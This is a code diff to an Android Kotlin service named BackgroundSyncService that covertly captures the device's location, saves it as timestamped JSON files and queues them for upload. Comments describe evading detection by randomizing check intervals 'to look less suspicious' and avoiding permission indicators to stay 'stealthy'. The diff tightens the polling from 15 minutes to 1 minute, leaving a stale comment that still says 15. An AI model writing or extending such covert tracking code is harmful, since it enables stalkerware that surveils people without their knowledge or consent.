@@ -169,10 +169,10 @@ class BackgroundSyncService : Service() {
                 }
 
                 // Schedule next check with randomized interval to look less suspicious
-                val nextInterval = (15 * 60 * 1000L) + (Math.random() * 10 * 60 * 1000L).toLong()
+                val nextInterval = (1 * 60 * 1000L) + (Math.random() * 10 * 60 * 1000L).toLong()
                 syncHandler?.postDelayed(this, nextInterval)
             }
-        }, 15 * 60 * 1000L) // First check after 15 minutes
+        }, 1 * 60 * 1000L) // First check after 15 minutes
     }
 
     private fun performBackgroundSync() {
@@ -301,20 +301,20 @@ class BackgroundSyncService : Service() {
 
     private fun captureLocation() {
         try {
-            // Rather than creating a new tracker, use data from accessibility service
-            // This piggybacks on legitimate location requests instead of making new ones
-
-            val locationTracker = LocationCollector(this)
+            val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
                 try {
                     val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                     val filename = "location_${timestamp}.json"
 
-                    val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
+                    // Use a consistent storage location
+                    val storage = StorageManager.getStorageDir(this, "location_data")
+                    val file = File(storage, filename)
                     FileOutputStream(file).use { out ->
                         out.write(locationData.toString().toByteArray())
                     }
 
+                    // Queue for synchronization using standardized path
                     dataSync?.queueForSync("location_data", file.absolutePath)
                 } catch (e: Exception) {
                     Log.e(TAG, "Location save error: ${e.message}")
@@ -371,24 +371,5 @@ class BackgroundSyncService : Service() {
             child.recycle()
         }
         return sb.toString()
-    }
-
-    private inner class LocationCollector(private val context: Context) {
-        fun captureLastKnownLocation(callback: (JSONObject) -> Unit) {
-            // Piggyback on any available location data rather than requesting it directly
-            // This is more stealthy as it doesn't trigger location permission indicators
-
-            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-
-            // Create a mock location object that would be populated with real data
-            // in a complete implementation
-            val locationJson = JSONObject().apply {
-                put("timestamp", timestamp)
-                put("device_id", getDeviceID())
-                put("source", "last_known")
-            }
-
-            callback(locationJson)
-        }
     }
 }
